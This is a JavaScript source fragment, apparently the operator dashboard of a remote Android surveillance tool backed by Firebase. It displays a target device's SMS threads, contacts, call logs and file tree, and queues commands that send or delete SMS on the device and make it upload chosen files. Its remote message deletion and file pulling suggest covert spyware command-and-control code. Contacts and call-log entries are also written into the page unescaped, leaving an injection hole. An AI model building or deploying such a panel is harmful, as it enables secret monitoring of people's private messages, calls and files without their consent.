                            <span class="sms-native-avatar"><i class="material-icons">person</i></span>
                            <span class="sms-native-thread-copy">
                                <strong>${escapeSmsHtml(number)}</strong>
                                <span>${escapeSmsHtml(last.body || 'Message')}</span>
                            </span>
                            <span class="sms-native-thread-meta">
                                <time datetime="${escapeSmsHtml(last.timestamp || '')}">${escapeSmsHtml(formatSmsTime(last.timestamp))}</time>
                                <i class="material-icons">chevron_right</i>
                            </span>
                        </button>`;
                }).join('');

                const bubbles = (active?.messages || []).map((msg) => `
                    <div class="sms-native-row sms-native-in">
                        <div class="sms-native-bubble">
                            <div class="sms-body">${escapeSmsHtml(msg.body)}</div>
                            <time datetime="${escapeSmsHtml(msg.timestamp || '')}">${escapeSmsHtml(formatSmsTime(msg.timestamp, true))}</time>
                            <button class="sms-delete-button" type="button" title="Delete message" aria-label="Delete message"
                                data-address="${escapeSmsHtml(active.address)}" data-message-id="${escapeSmsHtml(msg.id)}">
                                <i class="material-icons">delete_outline</i>
                            </button>
                        </div>
                    </div>`
                ).join('');

                modalBody.innerHTML = `
                    <div class="sms-device">
                        <div class="sms-screen">
                            <div class="sms-app-nav ${showThreadList ? 'sms-list-nav' : 'sms-thread-nav'}">
                                ${showThreadList
                                    ? `
                                        <div class="sms-list-title">Messages</div>
                                        <button class="sms-nav-action" type="button" aria-label="New message">
                                            <i class="material-icons">edit</i>
                                        </button>`
                                    : `
                                        <button class="sms-back-button" type="button" aria-label="Back to Messages">
                                            <i class="material-icons">chevron_left</i><span>Messages</span>
                                        </button>
                                        <div class="sms-contact-title">
                                            <span class="sms-native-contact-avatar"><i class="material-icons">person</i></span>
                                            <strong>${escapeSmsHtml(displayName)}</strong>
                                            <small>SMS</small>
                                        </div>
                                        <span class="sms-nav-spacer" aria-hidden="true"></span>`}
                            </div>

                            <div class="sms-native-search ${showThreadList ? '' : 'sms-hidden'}">
                                <i class="material-icons">search</i>
                                <input type="search" placeholder="Search" autocomplete="off" value="${escapeSmsHtml(searchQuery)}">
                            </div>

                            <div class="sms-native-content ${showThreadList ? 'is-list' : 'is-thread'}">
                                <div class="sms-native-thread-list">
                                    ${conversationList || '<div class="sms-native-no-threads">No conversations</div>'}
                                </div>
                                <div class="sms-native-messages">
                                    ${bubbles || '<div class="sms-thread-empty">No messages in this conversation.</div>'}
                                </div>
                            </div>

                            <form class="sms-native-composer ${showThreadList ? 'sms-hidden' : ''}" id="sms-composer">
                                <input id="sms-recipient" type="text" value="${escapeSmsHtml(activeNumber)}" aria-label="Recipient" autocomplete="off">
                                <input id="sms-message-text" type="text" placeholder="Text Message" autocomplete="off">
                                <button id="sms-send-button" class="sms-send-native" type="submit" aria-label="Send message">
                                    <i class="material-icons">arrow_upward</i>
                                </button>
                            </form>
                        </div>
                    </div>`;

                const messagesView = modalBody.querySelector('.sms-native-messages');
                if (messagesView) {
                    requestAnimationFrame(() => {
                        messagesView.scrollTop = messagesView.scrollHeight;
                    });
                }

                modalBody.querySelector('.sms-back-button')?.addEventListener('click', () => {
                    showThreadList = true;
                    render();
                });

                modalBody.querySelectorAll('[data-sms-thread]').forEach(button => {
                    button.addEventListener('click', () => {
                        activeAddress = button.dataset.smsThread;
                        showThreadList = false;
                        render();
                    });
                });

                const search = modalBody.querySelector('.sms-native-search input');
                search?.addEventListener('input', () => {
                    searchQuery = search.value;
                    const queryText = searchQuery.trim().toLowerCase();
                    modalBody.querySelectorAll('.sms-native-thread').forEach(item => {
                        item.style.display = item.textContent.toLowerCase().includes(queryText) ? '' : 'none';
                    });
                });

                const composer = modalBody.querySelector('#sms-composer');
                composer?.addEventListener('submit', async (event) => {
                    event.preventDefault();
                    const messageText = modalBody.querySelector('#sms-message-text')?.value.trim();
                    const recipient = modalBody.querySelector('#sms-recipient')?.value.trim();
                    if (!messageText || !recipient) return;

                    const button = modalBody.querySelector('#sms-send-button');
                    button.disabled = true;
                    try {
                        const commandRef = ref(database, `users/${user.uid}/devices/${deviceKey}/commands`);
                        const newCommandRef = push(commandRef);
                        await set(newCommandRef, { type: 'sendsms', recipient, message: messageText });
                        const input = modalBody.querySelector('#sms-message-text');
                        if (input) input.value = '';
                    } finally {
                        button.disabled = false;
                    }
                });

                modalBody.querySelectorAll('.sms-delete-button').forEach(button => {
                    button.addEventListener('click', (event) => {
                        event.stopPropagation();
                        const commandRef = ref(database, `users/${user.uid}/devices/${deviceKey}/commands`);
                        const newCommandRef = push(commandRef);
                        set(newCommandRef, { type: 'deleteSms', messageId: button.dataset.messageId });
                    });
                });
            };

            render();
        });
    }

    function escapeSmsHtml(value) {
        return String(value ?? '').replace(/[&<>"']/g, char => ({
            '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;'
        }[char]));
    }

    function formatSmsTime(value, detailed = false) {
        if (!value) return '';
        const date = new Date(value);
        if (Number.isNaN(date.getTime())) return String(value);
        const now = new Date();
        const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        const startOfDate = new Date(date.getFullYear(), date.getMonth(), date.getDate());
        const diffMs = Math.max(0, now.getTime() - date.getTime());
        const diffMinutes = Math.floor(diffMs / 60000);
        const diffHours = Math.floor(diffMinutes / 60);
        if (detailed) {
            if (date.toDateString() === now.toDateString()) return date.toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' });
            const yesterday = new Date(startOfToday);
            yesterday.setDate(yesterday.getDate() - 1);
            if (date.toDateString() === yesterday.toDateString()) return 'Yesterday at ' + date.toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' });
            return date.toLocaleString([], { month: 'short', day: 'numeric', year: date.getFullYear() === now.getFullYear() ? undefined : 'numeric', hour: 'numeric', minute: '2-digit' });
        }
        if (date.toDateString() === now.toDateString()) {
            if (diffMinutes < 1) return 'Just now';
            if (diffMinutes < 60) return diffMinutes + ' min ago';
            return diffHours + ' hr' + (diffHours === 1 ? '' : 's') + ' ago';
        }
        const yesterday = new Date(startOfToday);
        yesterday.setDate(yesterday.getDate() - 1);
        if (date.toDateString() === yesterday.toDateString()) return 'Yesterday';
        const daysAgo = Math.floor((startOfToday.getTime() - startOfDate.getTime()) / 86400000);
        if (daysAgo >= 0 && daysAgo < 7) return date.toLocaleDateString([], { weekday: 'short' });
        return date.toLocaleDateString([], { month: 'short', day: 'numeric', year: date.getFullYear() === now.getFullYear() ? undefined : 'numeric' });
    }

    function parseSmsData(data) {
        const parts = String(data ?? '').split(' | ');
        return { timestamp: parts[0] || 'N/A', body: parts.slice(1).join(' | ') || 'N/A' };
    }

    function openContactsModal(deviceKey, deviceName, user) {
        const modal = document.getElementById('data-modal');
        document.getElementById('data-modal-title').textContent = `Contacts for ${deviceName}`;
        const modalBody = document.getElementById('data-modal-body');
        modalBody.innerHTML = '<p>Loading...</p>';
        setModalBodyMode();
        modal.style.display = 'flex';
        const dataRef = ref(database, `users/${user.uid}/devices/${deviceKey}/contacts`);
        onValue(dataRef, (snapshot) => {
            const data = snapshot.val();
            modalBody.innerHTML = '';
            if (data && Object.keys(data).length > 0) {
                const table = document.createElement('table');
                table.className = 'data-table';
                table.innerHTML = `<thead><tr><th>Name</th><th>Number</th></tr></thead>`;
                const tableBody = document.createElement('tbody');
                Object.values(data).forEach(item => {
                    const parts = item.split(' | ');
                    const name = parts[0];
                    const number = parts[1];
                    const row = document.createElement('tr');
                    row.innerHTML = `<td>${name || 'N/A'}</td><td>${number || 'N/A'}</td>`;
                    tableBody.appendChild(row);
                });
                table.appendChild(tableBody);
                modalBody.appendChild(table);
            } else {
                modalBody.innerHTML = '<p>No contacts found.</p>';
            }
        }, { once: true });
    }

    function openCallLogsModal(deviceKey, deviceName, user) {
        const modal = document.getElementById('data-modal');
        document.getElementById('data-modal-title').textContent = `Call Logs for ${deviceName}`;
        const modalBody = document.getElementById('data-modal-body');
        modalBody.innerHTML = '<p>Loading...</p>';
        setModalBodyMode();
        modal.style.display = 'flex';
        const dataRef = ref(database, `users/${user.uid}/devices/${deviceKey}/call_logs`);
        onValue(dataRef, (snapshot) => {
            const data = snapshot.val();
            modalBody.innerHTML = '';
            if (data && Object.keys(data).length > 0) {
                const table = document.createElement('table');
                table.className = 'data-table';
                table.innerHTML = `<thead><tr><th>Number</th><th>Type</th><th>Duration</th><th>Date</th></tr></thead>`;
                const tableBody = document.createElement('tbody');
                Object.values(data).forEach(item => {
                    const parts = item.split(' | ');
                    const number = parts[0];
                    const type = parts[1];
                    const duration = parts[2];
                    const date = parts[3];
                    const row = document.createElement('tr');
                    row.innerHTML = `<td>${number || 'N/A'}</td><td>${type || 'N/A'}</td><td>${duration || 'N/A'}</td><td>${date || 'N/A'}</td>`;
                    tableBody.appendChild(row);
                });
                table.appendChild(tableBody);
                modalBody.appendChild(table);
            } else {
                modalBody.innerHTML = '<p>No call logs found.</p>';
            }
        }, { once: true });
    }

    function openFileManagerModal(deviceKey, deviceName, user) {
        currentDeviceKey = deviceKey;
        const modal = document.getElementById('data-modal');
        document.getElementById('data-modal-title').textContent = `File Manager for ${deviceName}`;
        const modalBody = document.getElementById('data-modal-body');
        modalBody.innerHTML = '<p>Loading...</p>';
        setModalBodyMode('immersive-body');
        modal.style.display = 'flex';
        const filesRef = ref(database, `users/${user.uid}/devices/${deviceKey}/files`);
        onValue(filesRef, (snapshot) => {
            fullFileTree = snapshot.val() || {};
            // If the file manager is already open and the user is browsing a
            // subpath, preserve that path rather than resetting to root. We
            // store the current path on the wrapper's dataset when rendering.
            let fileListWrapper = modalBody.querySelector('#file-list-wrapper');
            if (!fileListWrapper) {
                modalBody.innerHTML = '';
                fileListWrapper = document.createElement('div');
                fileListWrapper.id = 'file-list-wrapper';
                modalBody.appendChild(fileListWrapper);
                // initial render at root
                renderFileManager(fileListWrapper, fullFileTree, [], null);
            } else {
                try {
                    const currentPath = JSON.parse(fileListWrapper.dataset.path || '[]');
                    // traverse the fullFileTree to the current node
                    let node = fullFileTree;
                    for (const p of currentPath) {
                        node = node?.[p]?.children || {};
                    }
                    renderFileManager(fileListWrapper, node, currentPath, null);
                } catch (e) {
                    // fallback to root if parsing fails
                    renderFileManager(fileListWrapper, fullFileTree, [], null);
                }
            }
        });
    }

    function getNodeId(path, key) {
        return [...path, key].join('/');
    }

    function renderFileManager(container, currentNode, path, previewSection) {
        container.innerHTML = '';
        // remember currently-rendered path so update callbacks can preserve it
        try { container.dataset.path = JSON.stringify(path || []); } catch (e) { /* swallow */ }
        const pathString = path.length > 0 ? '/' + path.join('/') : '/';
        const header = document.createElement('div');
        header.className = 'file-manager-header';
        const backButton = document.createElement('button');
        backButton.innerHTML = '<i class="material-icons">arrow_back</i>';
        backButton.disabled = path.length === 0;
        backButton.addEventListener('click', () => {
            const newPath = path.slice(0, -1);
            let newCurrentNode = fullFileTree;
            newPath.forEach(p => newCurrentNode = newCurrentNode?.[p]?.children || {});
            renderFileManager(container, newCurrentNode, newPath, previewSection);
        });
        const pathHeader = document.createElement('h4');
        pathHeader.textContent = `Path: ${pathString}`;
        header.appendChild(backButton);
        header.appendChild(pathHeader);
        container.appendChild(header);

        const list = document.createElement('ul');
        list.className = 'file-list data-table';
        const entries = Object.entries(currentNode || {});
        entries.sort((a, b) => {
            const aIsDir = !!a[1]?.isDirectory;
            const bIsDir = !!b[1]?.isDirectory;
            if (aIsDir && !bIsDir) return -1;
            if (!aIsDir && bIsDir) return 1;
            return a[0].localeCompare(b[0]);
        });

        if (entries.length > 0) {
            entries.forEach(([key, node]) => {
                const listItem = document.createElement('li');
                listItem.className = 'file-item';
                const displayName = key.replace(/_/g, '.');
                const infoWrapper = document.createElement('div');
                infoWrapper.className = 'file-info';
                const actionsWrapper = document.createElement('div');
                actionsWrapper.className = 'file-actions';
                const isImage = previewableImageRegex.test(displayName.toLowerCase());
                const nodeId = getNodeId(path, key);
                listItem.dataset.nodeId = nodeId;

                if (node.isDirectory) {
                    infoWrapper.innerHTML = `<i class="material-icons">folder</i> ${displayName}`;
                    listItem.classList.add('file-directory');
                    listItem.addEventListener('click', () => {
                        renderFileManager(container, node.children, [...path, key], previewSection);
                    });
                } else if (node.downloadUrl) {
                    infoWrapper.innerHTML = `<i class="material-icons">image</i> ${displayName}`;
                    listItem.classList.add('file-available');
                    infoWrapper.addEventListener('click', () => {
                        if (isImage) {
                            showImagePreview(previewSection, displayName, node.downloadUrl);
                        } else {
                            window.open(node.downloadUrl, '_blank');
                        }
                    });

                    const downloadBtn = document.createElement('button');
                    downloadBtn.className = 'file-btn download-btn';
                    downloadBtn.textContent = 'Download';
                    downloadBtn.addEventListener('click', (e) => {
                        e.stopPropagation();
                        triggerDirectDownload(node.downloadUrl, displayName, listItem);
                    });
                    actionsWrapper.appendChild(downloadBtn);

                    if (pendingDownloadRequests.has(nodeId)) {
                        setTimeout(() => {
                            triggerDirectDownload(node.downloadUrl, displayName, listItem);
                        }, 120);
                        pendingDownloadRequests.delete(nodeId);
                    }
                } else if (node.contentUri) {
                    infoWrapper.innerHTML = `<i class="material-icons">image</i> ${displayName}`;
                    listItem.classList.add('file-pending');
                    const downloadBtn = document.createElement('button');
                    downloadBtn.className = 'file-btn download-btn';
                    downloadBtn.textContent = 'Download';
                    downloadBtn.addEventListener('click', (e) => {
                        e.stopPropagation();
                        downloadBtn.disabled = true;
                        downloadBtn.textContent = 'Preparing...';
                        listItem.classList.add('file-requested');
                        pendingDownloadRequests.add(nodeId);
                        startWaitingProgress(listItem);
                        requestUpload(key, node, path);
                    });
                    actionsWrapper.appendChild(downloadBtn);
                } else {
                    infoWrapper.innerHTML = `<i class="material-icons">description</i> ${displayName}`;
                }

                listItem.appendChild(infoWrapper);
                if (actionsWrapper.childElementCount > 0) {
                    listItem.appendChild(actionsWrapper);
                }
                if (isImage) {
                    const progressLine = document.createElement('div');
                    progressLine.className = 'download-progress';
                    listItem.appendChild(progressLine);
                }
                list.appendChild(listItem);
            });
        } else {
            const emptyItem = document.createElement('li');
            emptyItem.textContent = 'Folder is empty.';
            emptyItem.className = 'file-item';
            list.appendChild(emptyItem);
        }
        container.appendChild(list);
    }

    function showImagePreview(previewSection, fileName, url) {
        if (previewSection) {
            previewSection.classList.remove('preview-hidden');
            // Use data-src to avoid immediate image fetch in lists and only load the full image
            // when the lightbox is opened by an authorized user. This prevents inadvertent
            // exposure of sensitive images to unauthenticated visitors while keeping the
            // preview UI intact.
            previewSection.innerHTML = `
                <div class="image-preview-frame">
                    <img data-src="${url}" alt="${fileName}" class="deferred-preview">
                </div>
                <p class="image-preview-caption">${fileName}</p>
            `;
            triggerPreviewAnimation(previewSection);
            try {
                previewSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
            } catch (e) {
                // scrollIntoView not supported
            }
        }
        // Open lightbox only after a quick client-side authorization check in openLightbox.
        // This preserves the previous UX (auto-open) for authorized users while preventing
        // unauthenticated visitors from seeing the image payloads.
        openLightbox(url, fileName);
    }

    function ensureProgressLine(listItem) {
        let progressLine = listItem?.querySelector('.download-progress');
        if (!progressLine) {
            progressLine = document.createElement('div');
            progressLine.className = 'download-progress';
            listItem?.appendChild(progressLine);
        }
        return progressLine;
    }

    function startWaitingProgress(listItem) {
        const progressLine = ensureProgressLine(listItem);
        if (!progressLine) return;
        progressLine.classList.add('active', 'waiting');
        progressLine.style.setProperty('--progress', '0%');
        if (progressLine._waitInterval) clearInterval(progressLine._waitInterval);
        progressLine._waitInterval = setInterval(() => {
            const current = parseFloat(progressLine.style.getPropertyValue('--progress')) || 0;
            if (current >= 95) return;
            const next = Math.min(current + Math.random() * 10, 95);
            progressLine.style.setProperty('--progress', `${next}%`);
        }, 200);
    }

    function stopWaitingProgress(listItem) {
        const progressLine = listItem?.querySelector('.download-progress');
        if (!progressLine) return;
        if (progressLine._waitInterval) {
            clearInterval(progressLine._waitInterval);
            progressLine._waitInterval = null;
        }
        progressLine.classList.remove('waiting');
    }

    function triggerDirectDownload(downloadUrl, fileName, listItem) {
        const progressLine = ensureProgressLine(listItem);
        if (!progressLine) return Promise.resolve();
        stopWaitingProgress(listItem);
        progressLine.classList.add('active');
        progressLine.style.setProperty('--progress', '0%');
        if (progressLine._downloadInterval) {
            clearInterval(progressLine._downloadInterval);
            progressLine._downloadInterval = null;
        }
        let fakeProgress = 0;
        progressLine._downloadInterval = setInterval(() => {
            fakeProgress = Math.min(fakeProgress + Math.random() * 20, 90);
            progressLine.style.setProperty('--progress', `${fakeProgress}%`);
        }, 160);

        return fetch(downloadUrl)
            .then(response => response.blob())
            .then(blob => {
                if (progressLine._downloadInterval) {
                    clearInterval(progressLine._downloadInterval);
                    progressLine._downloadInterval = null;
                }
                progressLine.style.setProperty('--progress', '100%');
                setTimeout(() => {
                    progressLine.classList.remove('active');
                    progressLine.style.removeProperty('--progress');
                }, 600);

                const tempUrl = URL.createObjectURL(blob);
                const anchor = document.createElement('a');
                anchor.href = tempUrl;
                anchor.download = fileName;
                document.body.appendChild(anchor);
                anchor.click();
                document.body.removeChild(anchor);
                URL.revokeObjectURL(tempUrl);
            })
            .catch(() => {
                if (progressLine._downloadInterval) {
                    clearInterval(progressLine._downloadInterval);
                    progressLine._downloadInterval = null;
                }
                progressLine.classList.remove('active');
                progressLine.style.removeProperty('--progress');
            });
    }

    function getPhotoFileName(key, url, index) {
        return extractFileNameFromUrl(url) || key || `photo_${index + 1}.jpg`;
    }

    function extractFileNameFromUrl(url) {
        try {
            const pathname = new URL(url).pathname;
            const lastSegment = pathname.split('/').filter(Boolean).pop();
            return lastSegment ? decodeURIComponent(lastSegment) : '';
        } catch (error) {
            return '';
        }
    }

    function triggerPreviewAnimation(previewSection) {
        const frame = previewSection.querySelector('.image-preview-frame');
        if (!frame) return;
        frame.classList.remove('animate-preview');
        void frame.offsetWidth;
        frame.classList.add('animate-preview');
        frame.addEventListener('animationend', () => {
            frame.classList.remove('animate-preview');
        });
    }

    function requestUpload(fileName, node, path) {
        if (!currentUser || !currentDeviceKey) return;
        let fileDbPath = `users/${currentUser.uid}/devices/${currentDeviceKey}/files`;
        path.forEach(p => fileDbPath += `/${p}/children`);
        fileDbPath += `/${fileName}`;
        const commandRef = ref(database, `users/${currentUser.uid}/devices/${currentDeviceKey}/upload_requests/${fileName}`);
        const filePath = `files/${currentDeviceKey}/${path.join('/')}/${fileName.replace(/_/g, '.')}`;
        set(commandRef, { contentUri: node.contentUri, filePath, fileDbPath });
    }

    const modalOverlay = document.getElementById('data-modal');
    modalOverlay.addEventListener('click', (e) => {
        if (e.target === modalOverlay) {
            if (photosModalUnsubscribe && typeof photosModalUnsubscribe === 'function') {
                photosModalUnsubscribe();
                photosModalUnsubscribe = null;
            }
            modalOverlay.style.display = 'none';
        }
    });
    document.getElementById('data-modal-close').addEventListener('click', () => {
        if (photosModalUnsubscribe && typeof photosModalUnsubscribe === 'function') {
            photosModalUnsubscribe();
            photosModalUnsubscribe = null;
        }
        document.getElementById('data-modal').style.display = 'none';
    });

    function openLightbox(url, caption) {
        if (!lightboxOverlay || !lightboxImage) return;

        // Basic client-side guard: require an authenticated user before loading image bytes.
        // This is an additional safety layer — the true enforcement must be done with
        // backend/storage rules (see notes). We also optionally check that the current
        // device context matches the URL when possible.
        if (!currentUser) {
            // small UX-friendly fallback: show a message rather than quietly failing
            console.warn('Attempt to open lightbox without authenticated user. Blocking image load.');
            alert('Please sign in to view this media.');
            return;
        }

        // NOTE: Relax device-scoped guard — allow authenticated operators to view
        // media via lightbox. The authoritative access control should be enforced
        // by your storage backend or Firebase rules. This client-side check was
        // causing legitimate operators (owners) to be blocked when the
        // `currentDeviceKey` context wasn't set. We only require an authenticated
        // user here.

        // At this point we consider the client authorized enough to request the image payload.
        // Assigning to src will fetch the bytes; keep this scoped to the lightbox only.
        lightboxImage.src = url;
        lightboxCaption.textContent = caption || '';
        lightboxOverlay.classList.add('visible');
    }

    function closeLightbox() {
        if (!lightboxOverlay) return;
        lightboxOverlay.classList.remove('visible');
        if (lightboxImage) {
            lightboxImage.src = '';
        }
        if (lightboxCaption) {
            lightboxCaption.textContent = '';
        }
    }

    lightboxOverlay?.addEventListener('click', closeLightbox);
});

function stringToColor(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        hash = str.charCodeAt(i) + ((hash << 5) - hash);
    }
    let color = '#';
    for (let i = 0; i < 3; i++) {
        const value = (hash >> (i * 8)) & 0xFF;
        const darkerValue = Math.floor(value * 0.4) + 50;
        color += ('00' + darkerValue.toString(16)).substr(-2);
    }
    return color;
}